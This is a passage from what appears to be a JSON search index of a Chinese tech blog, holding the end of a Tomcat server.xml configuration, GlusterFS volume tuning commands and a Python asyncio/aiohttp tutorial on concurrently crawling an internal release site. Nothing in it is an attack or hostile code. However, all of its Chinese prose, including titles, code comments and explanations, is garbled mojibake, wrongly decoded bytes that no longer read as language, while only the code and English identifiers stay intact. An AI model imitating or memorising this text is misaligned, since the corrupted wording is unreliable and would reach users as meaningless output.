acceptCount=\u0026#34;500\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e               maxThreads=\u0026#34;1000\u0026#34; \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e               minSpareThreads=\u0026#34;200\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e               enableLookups=\u0026#34;false\u0026#34; \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e               redirectPort=\u0026#34;8443\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e               connectionTimeout=\u0026#34;20000\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e               relaxedQueryChars=\u0026#34;[]|{}@!$*()+\u0026#39;.,;^\\`\u0026amp;quot;\u0026amp;lt;\u0026amp;gt;\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e               disableUploadTimeout=\u0026#34;true\u0026#34; \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e               allowTrace=\u0026#34;false\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e               URIEncoding=\u0026#34;UTF-8\u0026#34; \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e               useBodyEncodingForURI=\u0026#34;true\u0026#34; /\u0026gt;  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026lt;Engine name\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Catalina\u0026#34; defaultHost=\u0026#34;localhost\u0026#34;\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e      \u0026lt;Realm className=\u0026#34;org.apache.catalina.realm.LockOutRealm\u0026#34;\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e        \u0026lt;Realm className=\u0026#34;org.apache.catalina.realm.UserDatabaseRealm\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e               resourceName=\u0026#34;UserDatabase\u0026#34;/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e      \u0026lt;/Realm\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e      \u0026lt;Host name=\u0026#34;localhost\u0026#34; appBase=\u0026#34;webapps\u0026#34; unpackWARs=\u0026#34;false\u0026#34; autoDeploy=\u0026#34;false\u0026#34;\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e          \u0026lt;Valve className=\u0026#34;org.apache.catalina.valves.AccessLogValve\u0026#34; directory=\u0026#34;logs\u0026#34; prefix=\u0026#34;access_log.\u0026#34; suffix=\u0026#34;.txt\u0026#34;  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e                fileDateFormat=\u0026#34;yyyy-MM-dd\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e                pattern=\u0026#34;%a|%A|%T|%{X-Forwarded-For}i|%l|%u|%t|%r|%s|%b|%{Referer}i|%{User-Agent}i \u0026#34; resolveHosts=\u0026#34;false\u0026#34;/\u0026gt; \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e          \u0026lt;Context path=\u0026#34;\u0026#34; docBase=\u0026#34;/export/servers/tomcat/webapps/web\u0026#34; /\u0026gt; \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e      \u0026lt;/Host\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026lt;/Engine\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003e\u0026lt;/Service\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e\u0026lt;/Server\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eåˆ†è§£å¼€æ¥ä¸€éƒ¨åˆ†ä¸€éƒ¨åˆ†çš„çœ‹ï¼š\u003c/p\u003e","title":"Tomcat server.xmlé…ç½®è¯¦ç»†è§£é‡Š"},{"content":"å…¬å¸ç”¨äº†6å¹´çš„GlusterFSç»ˆäºåˆ°äº†è¦è°ƒæ•´å·å‚æ•°çš„åœ°æ­¥äº†ã€‚\nå°æ–‡ä»¶å·²ç»å¤šåˆ°è¦å½±å“ IO çš„åœ°æ­¥äº†ã€‚\né¦–å…ˆè¯´ä¸€ä¸‹ç»“è®ºï¼ŒGlusterFS å®‰è£…å®Œæˆåï¼ŒåŸºæœ¬ä¸éœ€è¦è°ƒæ•´ä»»ä½•å‚æ•°ã€‚ç”Ÿäº§ç³»ç»Ÿåƒä¸‡ä¸å¯ç›²ç›®ï¼\nç„¶åæˆ‘ä»¬è¿™æ˜¯æœ‰ç‰¹æ®Šæƒ…å†µï¼Œæ‰€ä»¥è°ƒä¼˜æ­¥éª¤å¦‚ä¸‹ï¼ˆä»¥å·åä¸º esign-vol ä¸ºä¾‹ï¼‰ï¼š\n#å¿…é¡»å…³æ‰NFS gluster volume set esign-vol nfs.disable on #å¿…é¡»ä¿ç•™10%çš„ç©ºé—´ï¼Œé¿å…å¡çˆ†å·ç©ºé—´ gluster volume set esign-vol cluster.min-free-disk 10% #æœ¬æœºæœ‰256Gçš„å†…å­˜ï¼Œæ‰€ä»¥è®¾ç½®25Gçš„è¯»ç¼“å­˜ gluster volume set esign-vol performance.cache-size 25GB #è¯»ç¼“å­˜ä¸­ï¼Œå•ä¸ªæ–‡ä»¶çš„ç¼“å­˜ï¼Œæœ€å¤§æ–‡ä»¶sizeæ˜¯128MBï¼Œå¤§äº128MBçš„å•ä¸ªæ–‡ä»¶ä¸ç¼“å­˜ gluster volume set esign-vol performance.cache-max-file-size 128MB #è®¾ç½®æ¯ä¸ªå®¢æˆ·ç«¯éƒ½å…è®¸å¤šçº¿ç¨‹ï¼Œç¼ºçœæ˜¯2ï¼Œå¤šä¸ªå°æ–‡ä»¶å¢åŠ ä¸º4 gluster volume set esign-vol client.event-threads 4 #è®¾ç½®æœåŠ¡å™¨ç«¯å¯¹ç‰¹å®šçš„å·å…è®¸å¤šçº¿ç¨‹ï¼Œç¼ºçœæ˜¯1,å¤šä¸ªå°æ–‡ä»¶å¢åŠ ä¸º4 gluster volume set esign-vol server.event-threads 4 #åˆ†å‰²çº¿ï¼Œä»¥ä¸‹å‚æ•°ä¸è¦è°ƒæ•´ï¼Œé™¤éæ˜ç¡®çŸ¥é“åæœ #è®¾ç½® io çº¿ç¨‹æ•°é‡ï¼Œè¿™ä¸ªå€¼ç¼ºçœæ˜¯16ï¼Œå·²ç»å¾ˆå¤§äº†ï¼Œè¶³å¤Ÿç”¨ gluster volume set esign-vol performance.io-thread-count 16 #è®¾ç½®å†™ç¼“å†²åŒºï¼Œè¿™ä¸ªå€¼ç¼ºçœæ˜¯1Mï¼Œå¼„å¤§äº†å¦‚æœåœç”µä»€ä¹ˆçš„ï¼Œä¼šä¸¢æ•°æ® gluster volume set esign-vol performance.write-behind-window-size: 1M ä»¥ä¸Šå°±å¯ä»¥äº†ã€‚è¿˜æœ‰ä¸ªå‚æ•° global-threading ï¼Œç¼ºçœæ˜¯ offï¼Œä¸è¦è®¾ç½®ä¸º onï¼Œæœ‰ä½¿ç”¨æ¡ä»¶çš„ï¼Œå¼„é”™äº†åè€Œä¼šå¯¼è‡´æ€§èƒ½é™ä½ã€‚\n","permalink":"https://rendoumi.com/posts/20211115-gluster_tuning/","summary":"\u003cp\u003eå…¬å¸ç”¨äº†6å¹´çš„GlusterFSç»ˆäºåˆ°äº†è¦è°ƒæ•´å·å‚æ•°çš„åœ°æ­¥äº†ã€‚\u003c/p\u003e\n\u003cp\u003eå°æ–‡ä»¶å·²ç»å¤šåˆ°è¦å½±å“ IO çš„åœ°æ­¥äº†ã€‚\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆè¯´ä¸€ä¸‹ç»“è®ºï¼ŒGlusterFS å®‰è£…å®Œæˆåï¼ŒåŸºæœ¬ä¸éœ€è¦è°ƒæ•´ä»»ä½•å‚æ•°ã€‚ç”Ÿäº§ç³»ç»Ÿåƒä¸‡ä¸å¯ç›²ç›®ï¼\u003c/p\u003e\n\u003cp\u003eç„¶åæˆ‘ä»¬è¿™æ˜¯æœ‰ç‰¹æ®Šæƒ…å†µï¼Œæ‰€ä»¥è°ƒä¼˜æ­¥éª¤å¦‚ä¸‹ï¼ˆä»¥å·åä¸º esign-vol ä¸ºä¾‹ï¼‰ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#å¿…é¡»å…³æ‰NFS\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e esign-vol nfs.disable on\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#å¿…é¡»ä¿ç•™10%çš„ç©ºé—´ï¼Œé¿å…å¡çˆ†å·ç©ºé—´\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e esign-vol cluster.min-free-disk 10%\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#æœ¬æœºæœ‰256Gçš„å†…å­˜ï¼Œæ‰€ä»¥è®¾ç½®25Gçš„è¯»ç¼“å­˜\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e esign-vol performance.cache-size 25GB\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#è¯»ç¼“å­˜ä¸­ï¼Œå•ä¸ªæ–‡ä»¶çš„ç¼“å­˜ï¼Œæœ€å¤§æ–‡ä»¶sizeæ˜¯128MBï¼Œå¤§äº128MBçš„å•ä¸ªæ–‡ä»¶ä¸ç¼“å­˜\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e esign-vol performance.cache-max-file-size 128MB\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#è®¾ç½®æ¯ä¸ªå®¢æˆ·ç«¯éƒ½å…è®¸å¤šçº¿ç¨‹ï¼Œç¼ºçœæ˜¯2ï¼Œå¤šä¸ªå°æ–‡ä»¶å¢åŠ ä¸º4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e esign-vol client.event-threads \u003cspan class=\"m\"\u003e4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#è®¾ç½®æœåŠ¡å™¨ç«¯å¯¹ç‰¹å®šçš„å·å…è®¸å¤šçº¿ç¨‹ï¼Œç¼ºçœæ˜¯1,å¤šä¸ªå°æ–‡ä»¶å¢åŠ ä¸º4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e esign-vol server.event-threads \u003cspan class=\"m\"\u003e4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#åˆ†å‰²çº¿ï¼Œä»¥ä¸‹å‚æ•°ä¸è¦è°ƒæ•´ï¼Œé™¤éæ˜ç¡®çŸ¥é“åæœ\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#è®¾ç½® io çº¿ç¨‹æ•°é‡ï¼Œè¿™ä¸ªå€¼ç¼ºçœæ˜¯16ï¼Œå·²ç»å¾ˆå¤§äº†ï¼Œè¶³å¤Ÿç”¨\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e esign-vol performance.io-thread-count \u003cspan class=\"m\"\u003e16\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#è®¾ç½®å†™ç¼“å†²åŒºï¼Œè¿™ä¸ªå€¼ç¼ºçœæ˜¯1Mï¼Œå¼„å¤§äº†å¦‚æœåœç”µä»€ä¹ˆçš„ï¼Œä¼šä¸¢æ•°æ®\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume \u003cspan class=\"nb\"\u003eset\u003c/span\u003e esign-vol performance.write-behind-window-size: 1M  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä»¥ä¸Šå°±å¯ä»¥äº†ã€‚è¿˜æœ‰ä¸ªå‚æ•° global-threading ï¼Œç¼ºçœæ˜¯ offï¼Œä¸è¦è®¾ç½®ä¸º onï¼Œæœ‰ä½¿ç”¨æ¡ä»¶çš„ï¼Œå¼„é”™äº†åè€Œä¼šå¯¼è‡´æ€§èƒ½é™ä½ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211115113321750\" loading=\"lazy\" src=\"/posts/20211115-gluster_tuning/image-20211115113321750.png\"\u003e\u003c/p\u003e","title":"GlusterFSæ–‡ä»¶ç³»ç»Ÿçš„ä¼˜åŒ–"},{"content":"åœ¨å®é™…ä¸­é‡åˆ°è¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼Œå…¬å¸è½¯ä»¶å‘å¸ƒä¸Šçº¿è‡ªåŠ¨åŒ–ã€‚\nè¯´ç®€å•ç‚¹ï¼Œå°±æ˜¯éœ€è¦å»ç™»å½•ä¸€ä¸ªä¸Šçº¿çš„å†…éƒ¨ç½‘ç«™ï¼Œç„¶åçˆ¬ä¸‹æ‰€æœ‰çš„ä¸Šçº¿æ•°æ®ã€‚\nç„¶åæ ¹æ®çˆ¬ä¸‹æ¥çš„æ•°æ®æ•´ç†å¥½ï¼Œå¯ä»¥ä¸€èµ·ä¸Šçº¿çš„ï¼Œå°±å¹¶å‘å¤šçº¿ç¨‹ï¼Œå…¶å®å°±æ˜¯å»ä¼ å‚æ•°ç‚¹å‡»ä¸€ä¸ªé“¾æ¥ç­‰è¿”å›ã€‚\nä¸èƒ½å¹¶å‘çš„å°±å•çº¿ç¨‹ç‚¹é“¾æ¥ã€‚\né‚£è¿™ä¸ªäº‹æƒ…å¿…é¡»æ›´æœ‰æ•ˆç‡ï¼Œå•çº¿ç¨‹çš„æ²¡é—®é¢˜ï¼Œç”¨ python çš„ request å°±å¯ä»¥å®ç°äº†ã€‚\næˆ‘ä»¬ä»”ç»†ç ”ç©¶ä¸€ä¸‹åç¨‹ï¼Œå…ˆè®²ä¸€ä¸‹å†å²ï¼š\nä½¿ç”¨Pythonçš„äººå¾€å¾€çº ç»“åœ¨å¤šçº¿ç¨‹ã€å¤šè¿›ç¨‹ï¼Œå“ªä¸ªæ•ˆç‡æ›´é«˜ï¼Ÿåˆ°åº•ç”¨å“ªä¸ªå¥½å‘¢ï¼Ÿ\nå…¶å® Python çš„å¤šè¿›ç¨‹å’Œå¤šçº¿ç¨‹ï¼Œç›¸å¯¹äºåˆ«å®¶çš„åç¨‹å’Œå¼‚æ­¥å¤„ç†æœºåˆ¶ï¼Œéƒ½ä¸è¡Œï¼Œçº¿ç¨‹ä¹‹é—´åˆ‡æ¢è€—è´¹ CPU å’Œå¯„å­˜å™¨ï¼ŒOS çš„è°ƒåº¦ä¸å¯æ§ï¼Œå¤šè¿›ç¨‹ä¹‹é—´é€šè®¯ä¹Ÿä¸ä¾¿ã€‚æ€§èƒ½æ ¹æœ¬ä¸è¡Œã€‚\nåæ¥å‘¢ Python æ”¹è¿›äº†è¯­æ³•ï¼Œå‡ºç°äº† yiled from å……å½“åç¨‹è°ƒåº¦ï¼Œæœ‰äººå°±æ ¹æ®è¿™ä¸ªç‰¹æ€§å¼€å‘äº†ç¬¬ä¸‰æ–¹çš„åç¨‹æ¡†æ¶ï¼ŒTornadoï¼ŒGeventç­‰ã€‚\nå®˜æ–¹ä¹Ÿä¸èƒ½åè§†ä¸ç†å•Šï¼Œä»»å‡­åˆ«äººå‡ºé£å¤´ï¼Œäºæ˜¯ Python ä¹‹çˆ¶æ·±å…¥ç®€å‡º3å¹´ï¼Œè‹¦å¿ƒé’»ç ”è‡ªå®¶çš„åç¨‹ï¼Œasync/await å’Œ asyncio åº“ï¼Œå¹¶æ”¾åˆ° Python3.5 åæˆä¸ºå®˜æ–¹åŸç”Ÿçš„åç¨‹ã€‚\nå¯¹äº httpè¯·æ±‚ã€è¯»å†™æ–‡ä»¶ã€è¯»å†™æ•°æ®åº“è¿™ç§é«˜å»¶æ—¶çš„ IO æ“ä½œï¼Œåç¨‹æ˜¯ä¸ªå¤§æ€å™¨ï¼Œä¼˜ç‚¹éå¸¸å¤šï¼›å®ƒå¯ä»¥åœ¨é¢„æ–™åˆ°ä¸€ä¸ªé˜»å¡å°†å‘ç”Ÿæ—¶ï¼ŒæŒ‚èµ·å½“å‰åç¨‹ï¼Œè·‘å»æ‰§è¡Œå…¶å®ƒåç¨‹ï¼ŒåŒæ—¶æŠŠäº‹ä»¶æ³¨å†Œåˆ°å¾ªç¯ä¸­ï¼Œå®ç°äº†å¤šåç¨‹å¹¶å‘ï¼Œå…¶å®è¿™ç©æ„æ˜¯è·Ÿ Nodejs çš„å›è°ƒå­¦çš„ã€‚\nçœ‹ä¸‹å›¾ï¼Œè¯¦ç»†è§£é‡Šä¸‹ï¼Œå·¦è¾¹æˆ‘ä»¬æœ‰100ä¸ªç½‘é¡µè¯·æ±‚ï¼Œå¹¶å‘100ä¸ªåç¨‹è¯·æ±‚ï¼ˆå…¶å®ä¹Ÿæ˜¯1ä¸ª1ä¸ªå‘ï¼‰ï¼Œå½“éœ€è¦ç­‰å¾…é•¿æ—¶é—´å›åº”å›åº”æ—¶ï¼ŒæŒ‚èµ·å½“å‰åç¨‹ï¼Œå¹¶æ³¨å†Œä¸€ä¸ªå›è°ƒå‡½æ•°åˆ°äº‹ä»¶å¾ªç¯ï¼ˆEvent Loopï¼‰ä¸­ï¼Œæ‰§è¡Œä¸‹ä¸€ä¸ªåç¨‹ï¼Œå½“æœ‰åç¨‹äº‹ä»¶å®Œæˆå†é€šè¿‡å›è°ƒå‡½æ•°å”¤é†’æŒ‚èµ·çš„åç¨‹ï¼Œç„¶åè¿”å›ç»“æœã€‚\nè¿™ä¸ªè·Ÿ nodejs çš„å›è°ƒå‡½æ•°åŸºæœ¬ä¸€æ ·ï¼Œæˆ‘ä»¬å¿…é¡»æ³¨æ„ä¸»è¿›ç¨‹å’Œåç¨‹çš„å…³ç³»ï¼Œå¦‚æœæˆ‘åœ¨ä¸€ä¸ªä¸»è¿›ç¨‹ä¸­ï¼Œè§¦å‘åç¨‹å‡½æ•°ï¼Œæœ‰100ä¸ªåç¨‹ï¼Œé‚£ä¹ˆå¿…é¡»ç­‰å¾…100ä¸ªåç¨‹éƒ½ç»“æŸåï¼Œæ‰èƒ½å›åˆ°æ­£å¸¸çš„é‚£ä¸ªä¸»è¿›ç¨‹ä¸­ã€‚å½“ç„¶ï¼Œä¸»è¿›ç¨‹ä¹Ÿå¯èƒ½ä¹Ÿæ˜¯ä¸€ä¸ªåç¨‹ã€‚\né‚£ä¹ˆåç¨‹çš„åŸºæœ¬ç”¨æ³•\nasync f(n) å£°æ˜ä¸€ä¸ªå‡½æ•°æ˜¯åç¨‹çš„\nawait f(n) æŒ‚èµ·å½“å‰åç¨‹ï¼ŒæŠŠæ§åˆ¶æƒäº¤å› event loopï¼Œå¹¶ä¸”æ‰§è¡Œf(n)å’Œæ³¨å†Œä¹‹åçš„f(n)å›è°ƒã€‚\nä¸¾ä¸ªä¾‹å­ï¼šå¦‚æœåœ¨ g() è¿™ä¸ªå‡½æ•°ä¸­æ‰§è¡Œäº† await f()ï¼Œé‚£ä¹ˆg()å‡½æ•°ä¼šè¢«æŒ‚èµ·ï¼Œå¹¶ç­‰å¾… f() å‡½æ•°æœ‰ç»“æœç»“æŸï¼Œç„¶åè¿”å› g() ç»§ç»­æ‰§è¡Œã€‚\nasync def get(url): async with aiohttp.ClientSession() as session: async with session.get(url) as response: return await response.text() æœ€åä¸€è¡Œ await æ˜¯æŒ‚èµ·å‘½ä»¤ï¼ŒæŒ‚èµ·å½“å‰å‡½æ•° get() ï¼Œå¹¶æ‰§è¡Œ response.text() å’Œæ³¨å†Œå›è°ƒï¼Œç­‰å¾… response.text() æ‰§è¡Œå®Œæˆåé‡æ–°æ¿€æ´»å½“å‰å‡½æ•¸get()ç»§ç»­æ‰§è¡Œï¼Œè¿”å›ã€‚\næ‰€ä»¥ await åªå«åšæŒ‚èµ·æ˜¯ä¸å¤ªå¯¹çš„ï¼Œæ„Ÿè§‰åº”è¯¥å«åš æŒ‚èµ·å¹¶æ³¨å†Œå›è°ƒ æ¯”è¾ƒåˆé€‚ã€‚\nçœ‹ä»¥ä¸‹ç¨‹åºï¼Œåœ¨ Python 3.7 ä¹‹å‰ï¼Œåç¨‹æ˜¯è¿™ä¹ˆç”¨çš„ï¼š\nimport time import asyncio now = lambda : time.time() async def do_some_work(x): print(\u0026#39;Waiting: \u0026#39;, x) start = now() coroutine = do_some_work(2) loop = asyncio.get_event_loop() loop.run_until_complete(coroutine) print(\u0026#39;TIME: \u0026#39;, now() - start) æˆ‘ä»¬æŒ‡å®šäº†ä¸€ä¸ªåç¨‹ coroutine ï¼Œç„¶åå®šä¹‰äº†ä¸€ä¸ªäº‹ä»¶å¾ªç¯ loopï¼Œloop æ˜¯éœ€è¦ run_until_complete æ‰€æœ‰çš„åç¨‹ï¼Œç„¶åäº¤å‡ºæ§åˆ¶æƒï¼Œè¿”å›æ­£å¸¸çš„ä¸»è¿›ç¨‹ã€‚\nè·Ÿä¸Šå›¾å®Œå…¨åŒ¹é…ã€‚\nåœ¨ Python 3.7 ä¹‹åï¼Œç®€åŒ–äº†ç”¨æ³•ï¼Œä¸€å¥ asyncio.run å°±å¯ä»¥äº†ï¼š\nasyncio.run(do_some_work(2)) ä¸Šé¢ç¨‹åºå°±å˜äº†ï¼Œçœäº†å¥½å¤šï¼Œä½†æ˜¯å‰¯ä½œç”¨æ˜¯ç¬¬ä¸€æ¬¡çœ‹åˆ°çš„äººä¼šä¸æ˜ç™½å®ƒæ˜¯æ€ä¹ˆè¿›åŒ–è¿‡æ¥çš„ï¼š\nimport time import asyncio now = lambda : time.time() async def do_some_work(x): print(\u0026#39;Waiting: \u0026#39;, x) start = now() asyncio.run(do_some_work(2)) print(\u0026#39;TIME: \u0026#39;, now() - start) å¦‚æœæˆ‘ä»¬è¦è®¿é—®ä¸€ä¸ªç½‘ç«™çš„100ä¸ªç½‘é¡µï¼Œå•çº¿ç¨‹çš„åšæ³•æ˜¯ï¼šè¯·æ±‚ä¸€æ¬¡ï¼Œå›æ¥ä¸€æ¬¡ï¼Œç„¶åè¿›è¡Œä¸‹ä¸€ä¸ª\nfor url in urlsï¼š response=get(url) results=parse(response) è¿™æ ·æ•ˆç‡å¾ˆä½ï¼Œåç¨‹å‘¢ï¼Œåšæ³•å°±ä¸åŒäº†ï¼Œä¸€æ¬¡å‘èµ·100ä¸ªè¯·æ±‚ï¼ˆå‡†ç¡®çš„è¯´ä¹Ÿæ˜¯ä¸€ä¸ªä¸€ä¸ªå‘ï¼‰ï¼Œä¸åŒçš„æ˜¯åç¨‹ä¸ä¼šæ­»ç­‰è¿”å›ï¼Œè€Œæ˜¯å‘ä¸€ä¸ªè¯·æ±‚ï¼ŒæŒ‚èµ·ï¼Œå†å‘ä¸€ä¸ªå†æŒ‚èµ·ï¼Œå‘èµ·100ä¸ªï¼Œå°±æŒ‚èµ·100ä¸ªï¼Œç„¶åæ³¨å†Œå¹¶ç­‰å¾…100ä¸ªè¿”å›ï¼Œæ•ˆç‡æå‡äº†100å€ã€‚å¯ä»¥ç†è§£ä¸ºåŒæ—¶åšäº†100ä»¶äº‹ï¼Œåšåˆ°ç”±è‡ªå·±è°ƒåº¦è€Œä¸æ˜¯äº¤ç»™CPUï¼Œç¨‹åºçš„å¹¶å‘ç”±è‡ªå·±æ¥æ§åˆ¶ï¼Œè€Œä¸æ˜¯äº¤ç”± OS å»è°ƒåº¦ï¼Œæ•ˆç‡æå¤§çš„æé«˜äº†ã€‚\nè¿›åŒ–åˆ°åç¨‹ï¼Œæˆ‘ä»¬æŠŠè´¹ IO çš„ get å‡½æ•°æŠ½å‡ºæ¥æ”¾åˆ°åç¨‹é‡Œï¼š\nasync def get(url:str): my_conn = aiohttp.TCPConnector(limit=10) async with aiohttp.ClientSession(connector=my_conn) as session: async with session.get(url) as resp: return await resp.text() for url in urlsï¼š response=asyncio.run(get(url)) results=parse(response) å…·ä½“åˆ°æˆ‘ä»¬çš„é¡¹ç›®ï¼Œæˆ‘ä»¬é¦–å…ˆè¦ç™»å½•ä¸€ä¸ªç½‘é¡µæ‹¿åˆ° cookieï¼Œè¿™ä¸ªè¿‡ç¨‹å…¶å®å°±ä¸€ä¸ªåç¨‹ï¼Œæ²¡äººä¼šç™»å½•ä¸ªå‡ ç™¾æ¬¡å§ã€‚ç„¶åæŠŠæ”¾äº† cookie çš„ session 